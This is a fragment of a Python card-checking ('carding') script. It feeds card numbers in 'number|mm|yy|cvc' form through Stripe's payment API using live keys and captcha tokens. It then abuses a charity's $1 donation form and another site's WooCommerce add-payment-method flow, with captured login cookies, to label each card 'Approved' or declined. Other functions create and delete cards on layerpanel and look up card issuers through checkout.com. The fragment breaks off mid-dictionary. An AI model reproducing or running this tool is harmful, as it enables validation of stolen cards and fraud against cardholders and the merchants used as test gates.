    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
		
		json_data = {
		    'tokenId': id,
		}
		
		response = requests.post('https://api.layerpanel.com/api/panel/create-card/GB-81835134', headers=headers, json=json_data)
		if 'Token is Expired' in response.text:
			return up()
		if 'Token is Invalid' in response.text:
			return up()
		else:
			try:
				return (response.json()['errors'][0]['message'])
			except:
				pass
			id=response.json()['card_id']
			time.sleep(3)
			headers = {
			    'authority': 'api.layerpanel.com',
			    'accept': 'application/json, text/plain, */*',
			    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
			    'account': 'AM-78775822',
			    'authorization': f'Bearer {tok}',
			    'content-type': 'application/json;charset=UTF-8',
			    'locale': 'en',
			    'origin': 'https://cp.layerpanel.com',
			    'referer': 'https://cp.layerpanel.com/',
			    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			    'sec-ch-ua-mobile': '?1',
			    'sec-ch-ua-platform': '"Android"',
			    'sec-fetch-dest': 'empty',
			    'sec-fetch-mode': 'cors',
			    'sec-fetch-site': 'same-site',
			    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
			}
			
			json_data = {
			    'card_id': id,
			}
			
			response = requests.post('https://api.layerpanel.com/api/panel/delete-card/AM-78775822', headers=headers, json=json_data)
			return 'Approved'
	ii=chk()
	return ii
def info(card):
	if '3' == card[:1]:
		cvc=7706
	else:
		cvc=770
	headers = {
							'authorization': 'pk_q3mszgnusk66c24k7loecckxtaf',
							'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
						};json_data = {
							'type': 'card',
							'number': card,
							'expiry_month': 5,
							'expiry_year': 2024,
							'cvv': cvc,
							'name': 'JOHN HARGROVE',
							'phone': {},
							'preferred_scheme': '',
							'requestSource': 'JS',
						};response = requests.post('https://api.checkout.com/tokens', headers=headers, json=json_data)
	data = ['scheme', 'card_type', 'issuer']
	result = []
	for field in data:
		try:
			result.append(response.json()[field])
		except:
			result.append("------")
	try:
		us=response.json()['issuer_country']
		country=pycountry.countries.get(alpha_2=us).name
		result.append(country)
	except:
		result.append('----')
	try:
		us=response.json()['issuer_country']
		result.append(flagz.by_code(us))
	except:
		result.append('----')
	if 'card_number_invalid' in response.text:
		result.append('card_number_invalid')
	else:
		result.append('')
	return tuple(result)
def sd(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	user = user_agent.generate_user_agent()
	import requests
		
	headers = {
		    'authority': 'api.stripe.com',
		    'accept': 'application/json',
		    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
		    'content-type': 'application/x-www-form-urlencoded',
		    'origin': 'https://js.stripe.com',
		    'referer': 'https://js.stripe.com/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': user,
		}
		
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=6e2eaf99-534c-4da8-8fcf-c2eb40f3944ee32b7b&muid=e8d328c4-296b-4774-a76f-02d9502a0defa43228&sid=33254377-173c-4e99-aadb-04b14a7a732fec2fac&pasted_fields=number&payment_user_agent=stripe.js%2F228e9e4285%3B+stripe-js-v3%2F228e9e4285%3B+card-element&referrer=https%3A%2F%2Fdonkeydreamland.com&time_on_page=99906&key=pk_live_51InVTxLm10VHw4ikFr5d9P8RhLc99KPGGSfFTBsxldBewq0mzg8Ko8hqyDhszc3A6VS9l0U0qlJPbznEGwbuFVth00prZvIS0I&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYzs3gAHUB6CAKvW9ufx2u_JqxWZWHLvZUKeooMbvNW29-p_B3nANx5feJqkENzJ3RzXuIOrZA4Ds-WaLuYu7BpnVM9ARrTBcbQV9gXqI7LUQElcNU_XllGhZ6GW-2is26u36C5ftRu3q0Z9H4KxC3pwUtTkUOIubATSqAXHT3gV32dqLkEQO2vsGnuwTn_boXGtoVzD7CferPIF6i_4jzzlDvkzB7kRKcYpN4O8JFgiKsHVIursYRzmUnv4a6jei3V7ZaOvE9V4ofnzR8YrCVhXS66TyoJ6VtQc4kwjI7yJ7zXfoxNQVwms2GYHLBZF8AyqGWV4I2bjkFVDgxKOziXvK-US-iKRwGMMvnk7HGj4_j8SEmID-eWExsiYhZ5lVAjp-8DaBu5joqRTFDA0qrg6xfvE_MxSZWryjXubD1mKWj3MHKftpZ90pjUjGJLLGC2S_M_ZrXlyde9qnLV9PzJj-vdpCbfV7mmgk4hvHcTDI6CLCu8v_NM5D2MeMochaVPUqwFJLNy8d46oJ1vf5lmXzSuHNpKzcXhNZD0YFyUT2Y9XIhi13rwNdaHA7gxn7R58dnQ_HOT-d-3Fr4PAgJCOEoLMW6hc92Su_EMtIfCXRCFTfmqHeqlkFLlfzmiInhVmYMaG2vzo1JwP7MrXjvGOuFzeetTlELIBEWtMt19xQGXXQoSvCNowuJUxpL-wqO6BWs4M2_fqmaMs5MD7P2lhrMGCcF-48pi8owKRDGUG0DGebFcHpoCOpvFhY05cH9fl34al24aYWseqFRsszqCtMpKidO3hX48acV_VFWuj0dNPQwSEbwW2xWNeiNeZ9aIedg7H1SWj-IhopSbKlmIRYnumgYWzKykieOa0Gy0GAXVDDwE2OEKFcN4VOiEe9_0HbgZShdXFyOp1g8nW_09CuDupEJ5nYJYUNXKCC2aQccuUp6JDlYgfK5n-62tHho9ezhb_Vl3yES0nNvq1HI_qiA1xbcO9kxFy6yh0zEGKZgw4v-MNqcOikNjkibA3CaaJgfatqbAiYw6ydkFUuxk7SXs7YTMmyWUCNWPzBhTPhFDHbIhCijMn2_2JMHrr10bDptrsn-IOQabKfFtlEf6qXRMNps1N3JNxCNBcji0-wcPO5Fq1UNRfdcS0P7tRPC17eqYy2C7wlgLhAbobilklBdkc-BVkrB8Mw661hzsujeGOwQcQgUh9cAAshKBGk9cR9gc41_WErp299kBV6OKXjgJ81oNd_ZcSZSpl9Ir_ahvRD1TVccBEhu6jL5EMCzci1mv_eZuw0tZttX7sVj7vVw9kuewBYj-D_zf6_uMZemkYthhThJ4o3M7nJVcWHuiQNlTl1LhjUi2EKUSbjGEuRKxmM7nEn2oxgZ8YO6uzQY6oaLN1HUcr1WqmYFOsd56-RPyM7x005MWfEnZquNS-YCSmUX26mO3-UPO1qFfIi3w8a3UcKnExB_gi8dgJa9olpk8a0Lz0QZa9CHte9dAmxZoESWiRsVOwKkhTbvyN_D_O_jDKKPCRM2LmWy9fspE-EAKmr0fZNGrcLkPj3-P9G9eDflyjMKZRyEWyRpaBlywREgYv1nzbCAS632pTIgXxedh4YJyrDycJ4KYNwOk0J9wUoBq1LtcxVKBrwoYs3NRx0wJJ81GL8_igFu5P3LGb3a7OU-MLseErONcSiWeY-9ZbxkT8lC1y-lDIga_v1s40Xp_tfcG2ulUpCDjxu6gcI63TZEN0iUDThlOFmjYD5m2CkooWzgxpKMlAV8LGW88Xa22kEwTzirJ5LneEG7ujoQK3tN3APUghzt-p6it-Af41CEJ4H-l0dwSqwkS50hdghVUvOWgkLvLF5bZ8RpZIf71QIy2SAUO89kKv3KzssC_MXHQH8bJ8IsQrp7eAoMWBJLMDWnCsrH06Dl9gpgMAyNsMI1QVn3vEaGtpma0bQM_3CIgHgGyQqBsG8G8aH2yeX_JK0EhTdmtJKHDWO-TkB2PW71a8X6K1R2vMPfgVcMSZQZUIMsT9XJWW_oElTACgFwWUIY6rW9bXLlWvPSvABg5W8UG0El8cJLMPJ3MYWtWd73zW1BbM0BLrAvTgqkldRar44LIGGbzWrJxbVkUuSzAo2V4cM5mjJ_kqHNoYXJkX2lkzgMxg2-ia3KoMWZhNTc2NjGicGQA.W17OJ0WugGXQ1nH7LxMS0t7u1swFBlPlTCNZL2PNOzQ'
		
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	if "pm_" in response.text:
		pm = response.json()['id']
	import requests
		
	cookies = {
		    '_fbp': 'fb.1.1720491877785.226246623747650977',
		    '__stripe_mid': 'e8d328c4-296b-4774-a76f-02d9502a0defa43228',
		    '__stripe_sid': '33254377-173c-4e99-aadb-04b14a7a732fec2fac',
		    'borlabs-cookie': '%7B%22consents%22%3A%7B%22essential%22%3A%5B%22borlabs-cookie%22%2C%22wpml%22%5D%7D%2C%22domainPath%22%3A%22donkeydreamland.com%2F%22%2C%22expires%22%3A%22Sat%2C%2007%20Sep%202024%2002%3A24%3A51%20GMT%22%2C%22uid%22%3A%22anonymous%22%2C%22v3%22%3Atrue%2C%22version%22%3A1%7D',
		}
		
	headers = {
		    'Accept': '*/*',
		    'Accept-Language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
		    'Connection': 'keep-alive',
		    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		    # 'Cookie': '_fbp=fb.1.1720491877785.226246623747650977; __stripe_mid=e8d328c4-296b-4774-a76f-02d9502a0defa43228; __stripe_sid=33254377-173c-4e99-aadb-04b14a7a732fec2fac; borlabs-cookie=%7B%22consents%22%3A%7B%22essential%22%3A%5B%22borlabs-cookie%22%2C%22wpml%22%5D%7D%2C%22domainPath%22%3A%22donkeydreamland.com%2F%22%2C%22expires%22%3A%22Sat%2C%2007%20Sep%202024%2002%3A24%3A51%20GMT%22%2C%22uid%22%3A%22anonymous%22%2C%22v3%22%3Atrue%2C%22version%22%3A1%7D',
		    'Origin': 'https://donkeydreamland.com',
		    'Referer': 'https://donkeydreamland.com/one-off-donations/',
		    'Sec-Fetch-Dest': 'empty',
		    'Sec-Fetch-Mode': 'cors',
		    'Sec-Fetch-Site': 'same-origin',
		    'User-Agent': user,
		    'X-Requested-With': 'XMLHttpRequest',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		}
		
	params = {
		    't': '1720491977276',
		}
		
	data = {
		    'data': f'__fluent_form_embded_post_id=5761&_fluentform_63_fluentformnonce=00ded6d39c&_wp_http_referer=%2Fone-off-donations%2F&email=mero%40gmail.com&names%5Bfirst_name%5D=Mero&names%5Blast_name%5D=AYman&custom-payment-amount=1.00&payment_method_1=stripe&__stripe_payment_method_id={pm}',
		    'action': 'fluentform_submit',
		    'form_id': '63',
		}
		
	response = requests.post(
		    'https://donkeydreamland.com/wp-admin/admin-ajax.php',
		    params=params,
		    cookies=cookies,
		    headers=headers,
		    data=data,
		)
	if 'success' in response.text:
		return 'Approved'
	try:		
		ct=(response.json()['client_secret'])
		cts=ct.split('_secret_')[0]
	except:
		print(response.json())
		return 'Your card was declined.'
		
def scc(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	import requests
	headers = {
	    'accept': 'application/json',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
	
	data = f'type=card&billing_details[name]=+&billing_details[email]=adfeaqfa%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=78502b00-c105-497b-a387-9c3a944bf38c9a78ff&muid=9d51d6d0-d0f4-4403-87da-836ca70726e8bf10c8&sid=66b6d69a-c648-40d7-a5ca-ebbbb3ffe32180ac9f&payment_user_agent=stripe.js%2Fcb14e00af0%3B+stripe-js-v3%2Fcb14e00af0%3B+card-element&referrer=https%3A%2F%2Fladymcadden.org&time_on_page=27948&key=pk_live_51IdYQ0LfHgkJerZf3qLsCoyaWQ4rQttxhjKCSgwBT2v5I8v9ro1YqMeypLPf6GgmCArfNox09l16a2HMKVNxk02z00QG312A1Y&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiQmg5OUxIekJNVEtGMFo3dHpGaTVBKzJHNnlhQkFqTkdKYnZmSXVrSE9kRXJucE1lanBNZzVEWUFIemNYRVRnOWpMc0JWTU9oTmtBZVZxUkxJMHpzaHIxT240WjdmUS8vaS9sNHcwNUZ6UG5GZ3AyS3F0cUpIZTdVQVg1MUlKdlpQUEJHOFBzbnBFK0NuODU5ektLcm1zNGxQTjdYbUtsV2NtemRFdkIranRUcVllTVVudlJxODUybXV5Q25sbDREeXN2WWg0NTFvQTJJRHVOS01LcWtUZEhieVVVQi9ucHBTcjExN3VRbmVXaXozb3FGVzZqaWJGVHZ6U1JORXY2NDhCM3czV091RG9wdnZuc0d4TjBDM29ydEZtMzRvM3YrYnJCa09IeWxFR2hmVGVONHRBbWo5VjFNb1loZC83M1BRRjBFQkR2bXFkSnNFeFE3QW5Ta3pCek9PY1AwUFhCQlJCcWh1aVc1V1dTRGJGam9hdHJkbzNsbDloU3RiQksvVjdtMzFWUnBNSCtTTnNVVjVQVWg1b3ZPOVZvclJMeGNlRHA4WVpFN0p0WEFZNjNISkliRDYrZTdWTTE0SC82Tk5RWHlBTUJiL2VuYlZXdU5zdkxodFJHUkh4VnZMZTFBcEw3enlKcEs2ekVNYzRNVUUwSzkvc0JLR1ppd1R4Rm56YzJVcDAxZk1PUjN3ZWVwRE5hTXZDTy8zMUtRNnozM082Vy9qTG1vamEzUHNnQmFteU5FbDRBOUV6WHJ2UHVyTHpobng4WkFES2JkKzdlSjMxTG5Qb1RYR2VpN1EvVkR2RVdaYS93Wm94NTE0aGdPUmdKZElNRjJSOFYvVnRVOFJSN1BkQjJheVd2czFKR25lUjlDVkgxZkNzUHlNdldhbXR3VGMxRUplRk1VOC93eVZqWUdDMU84WHhiS1NMYVBCaU1GSG15VWxRUnhpdmxMdWhmNldwalBRK05QbXpacGlacWtOcjdFSFVqZ215QVpIbk43dElndFoxMk5TcjJYZzBmeS9zRjBwSWY1MkZ6Y2RnZ1dBcGRoK0lEejIyMWlaL0NVa0p6S1hUNU5taUk1SU80Mk5SSm1qOGhqelZPUWJ3aEVkeWcvQVdJNmtpRFRDVmFHTG9EcDNyVEpxSlBVTlhycVdib1A0Y2lhUW40Ty9aalljcWR2RlhwMm0yeWFZd1ZvbmIybHE0K0xIM1lXOUtiaVN4OVNKY0lzUUgxeFdtMy9taWtDSU1GbG53N3ZvZUlkSXZPWVloNExyNGVQSmRvWEErS2JmbDNvQkd3eW01YzF6TTF2N3ZwYXlscytxQm1hNWRreE9jRHNYWXVKMkhsVWxpN1lNWFBIZUJwaG5BazZXWDZLV3dDallmTXAxUnFnT0dhMzIwTDBXQWZ0dDhPaDFrYXdlbThIYlUzbGtyRkZRUDB3ck1zRGlWUGtzY3FqRjBpZHVyRFp5RDRmR0RQSGN1TEtTT2NPQTB3NEJ5Z2VNOVRmMmhsZXhmMGlpVUtyRjZXVlRmeXhrL2ZtYkU1bmJ0Q3JETkxQOEdGQzJkL25rcDRWSG5YNjFWUjBUK09HM1JCUHNXQTVtUkN5cEVVN20yb0lNeXg2SjNsamt1N29yckZhOFNCRnEvQ01pb2Z2ZHFPTGE5MDVTaXdzZHM5VzBOSFNMaEE1Vmd6K1hqdk9uQmp2MnBxL3lyTUlOV3NWMUxrWUJ1bzlCWStLNk8ySU5ycXAwckxOOEE0RXBrckhON1NCTXk5R2JNTitmRmRzOFY3dytEbW81SkJWdGZkL2dWSldVZDhVTkhOQzJBcXNIMWhWZVgyNG9QS0ZwejQ2a1lVcngzRjR2Q1dkbDA4M2djbVNjNmNmSU5Nd2dMaGdLZjZ2R0ovMW9LdE1WWHozUjJiYTFYWU1meFNBVFdTbzNjazF5cUoxamgyblRnbFpXSzk5ZmVBYjd5aWRWMy9EU3R1QmNWOUVGV1dSVnZ0bmZUNXpFVFlabDFiL3VBVHUxSDl0ZGcxeGJrY05wdTFMdHk5c0prTWFqVncyZlhpTkRucXEzenFGUlVKb0EvclJGTERKUEp1WGJkQXhobmlua2hMNXJ6UngyOHRwS1Q4aVVrcnFuSUk4NHQvTDB4dmxMa1RGUXhpNHhnaEhuNHcybHFUaDhsVUtodFZlMFhGTU9mcFlQcjJySjdWVHFRcHQwTzY2YmZxMVprMS9JT2NCbi90ZGJtb1FCVmZyc1JmdFhBclMrandTL3FtMmswQkVhdlEwcGxqQnJsN01zVnV0QzVhMUt5TVBiYjRIQ0k4ZUk0NWErRnpNRENhZVdOKzlmdVlSdllFRFZqOXNsd2dKeUs1SUdkcTF3ZWFid29SaXFmSlJHZFNTSDA5YnZaKzg4UE5Pd3o2R0VyYUJhUnFKY3Y1L0Q1VzV3czVFYlFGTWNjUmlMUmhRZmJER3plSE9qMGloQXdpQnpia2FJZ1VGekZTZ1VZZjNvSFlyVTRUQ1NGakxGQ0dKS3FaUXpIdGN5bFhBNjdLUU1lTzNqZ2dZN1NTcnc4cHJsdGVLMitWaS9WMm9qK0h3Vmx3dGt0ejJvRk04Q3NxM1V5UWt0alAzQ21CcjVoYkxjaVd1N3hSUSt2Y1h2UU16UTlrY0QzVldJZ281UXJwdHVFd1crdDUvSndMeHFvUUZpOGdTdExZc2VIVVJpVndxSVU0VTFzRzVOYTlXRTNMK1NOK3QwVjJ2MTdGQWppUFVpRHprYU56azM4ZXE1b1ZnVGc2YklsVEd1Z2hmb0NuazVJdnlFMmgrR1lFcUVhd2YxdnEwU3dNcmFRbWhKV2pWNzJiQ3ZIYTZjOGg2ZkZ4MlJsZThmb21YSnh1MG5nPT0iLCJleHAiOjE3MjQxODI1OTYsInNoYXJkX2lkIjo1MzU3NjU1OSwia3IiOiIzNTQxOTUxMSIsInBkIjowLCJjZGF0YSI6Ik10YWJ2RFo5THpTdm1Jem8waWUvZUE1UXV3UzRGNmZ2WUZ2RVA2dXp5dmNKU2FYY2JoaU92QzVvTENDU3FLenFucnFkdGc4SExhT0FkZXZjekpqdUlzME5kODdOZElGQk5Od1pCeXBGK1dsbi91S2Jadk0wSjdleEdSV3NNbSs0MTBOTHg2LzVyL2xIeWRUMzlFREN0UnRNdmhjT0s2V00wRXBWWlU2Z1BmdXNRN3hsTmwzSHE1RmtIRldsYUVkMlA3eDcwQ3R3QnNHT1FrWkoifQ.MGcDsyd3nY3Y6NfiX1jh7g-zxYwL1tvgLbJOAAduq1U'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	if "pm_" in response.text:
		pm = response.json()['id']
	with open('gates.json', 'r') as file:
		json_data = json.load(file)
		nonce=json_data['sc']['nonce']
	cookies = {
	    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-08-20%2019%3A33%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-08-20%2019%3A33%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36',
    'cookielawinfo-checkbox-necessary': 'yes',
    '_gid': 'GA1.2.2071831425.1724182427',
    '__stripe_mid': '9d51d6d0-d0f4-4403-87da-836ca70726e8bf10c8',
    '__stripe_sid': '66b6d69a-c648-40d7-a5ca-ebbbb3ffe32180ac9f',
    'cookielawinfo-checkbox-non-necessary': 'no',
    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOmZhbHNlfQ==',
    'viewed_cookie_policy': 'yes',
    'wordpress_logged_in_4b482996f3b50f66c45a4b49c7a73faf': 'adfeaqfa%7C1725392052%7C1eu9g5oIGKYYR4loolt8VYQ4MEADKstFQ9JqD4JwgCZ%7C8e03ac40c9e90934798c274a369fcded5a9a619a4c8e07bbbd53f31772432441',
    'wfwaf-authcookie-ef87ecef4dde9c78dcc1545fe505646f': '145%7Cother%7Cread%7C427f7df542976bb5f3c714a627fc90ab2ca141f68dc06a4bf8fcd928916dcb04',
    '_ga_TGRXJZZPXB': 'GS1.1.1724182424.1.1.1724182454.0.0.0',
    '_ga_DJ8QP66SFT': 'GS1.1.1724182426.1.1.1724182454.0.0.0',
    '_ga': 'GA1.1.685572626.1724182425',
    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fladymcadden.org%2Fmy-account%2Fadd-payment-method%2F',
}

	
	headers = {
	    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-20%2019%3A33%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-20%2019%3A33%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36; cookielawinfo-checkbox-necessary=yes; _gid=GA1.2.2071831425.1724182427; __stripe_mid=9d51d6d0-d0f4-4403-87da-836ca70726e8bf10c8; __stripe_sid=66b6d69a-c648-40d7-a5ca-ebbbb3ffe32180ac9f; cookielawinfo-checkbox-non-necessary=no; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOmZhbHNlfQ==; viewed_cookie_policy=yes; wordpress_logged_in_4b482996f3b50f66c45a4b49c7a73faf=adfeaqfa%7C1725392052%7C1eu9g5oIGKYYR4loolt8VYQ4MEADKstFQ9JqD4JwgCZ%7C8e03ac40c9e90934798c274a369fcded5a9a619a4c8e07bbbd53f31772432441; wfwaf-authcookie-ef87ecef4dde9c78dcc1545fe505646f=145%7Cother%7Cread%7C427f7df542976bb5f3c714a627fc90ab2ca141f68dc06a4bf8fcd928916dcb04; _ga_TGRXJZZPXB=GS1.1.1724182424.1.1.1724182454.0.0.0; _ga_DJ8QP66SFT=GS1.1.1724182426.1.1.1724182454.0.0.0; _ga=GA1.1.685572626.1724182425; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fladymcadden.org%2Fmy-account%2Fadd-payment-method%2F',
    'origin': 'https://ladymcadden.org',
    'priority': 'u=1, i',
    'referer': 'https://ladymcadden.org/my-account/add-payment-method/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': pm,
	    'nonce': nonce,
	}
	
	response = requests.post('https://ladymcadden.org/', params=params, cookies=cookies, headers=headers, data=data)

	cookies = {
	    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-08-20%2019%3A33%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-08-20%2019%3A33%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36',
    'cookielawinfo-checkbox-necessary': 'yes',
    '_gid': 'GA1.2.2071831425.1724182427',
    '__stripe_mid': '9d51d6d0-d0f4-4403-87da-836ca70726e8bf10c8',
    '__stripe_sid': '66b6d69a-c648-40d7-a5ca-ebbbb3ffe32180ac9f',
    'cookielawinfo-checkbox-non-necessary': 'no',
    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOmZhbHNlfQ==',
    'viewed_cookie_policy': 'yes',
    'wordpress_logged_in_4b482996f3b50f66c45a4b49c7a73faf': 'adfeaqfa%7C1725392052%7C1eu9g5oIGKYYR4loolt8VYQ4MEADKstFQ9JqD4JwgCZ%7C8e03ac40c9e90934798c274a369fcded5a9a619a4c8e07bbbd53f31772432441',
    'wfwaf-authcookie-ef87ecef4dde9c78dcc1545fe505646f': '145%7Cother%7Cread%7C427f7df542976bb5f3c714a627fc90ab2ca141f68dc06a4bf8fcd928916dcb04',
    '_ga_TGRXJZZPXB': 'GS1.1.1724182424.1.1.1724182454.0.0.0',
    '_ga_DJ8QP66SFT': 'GS1.1.1724182426.1.1.1724182454.0.0.0',
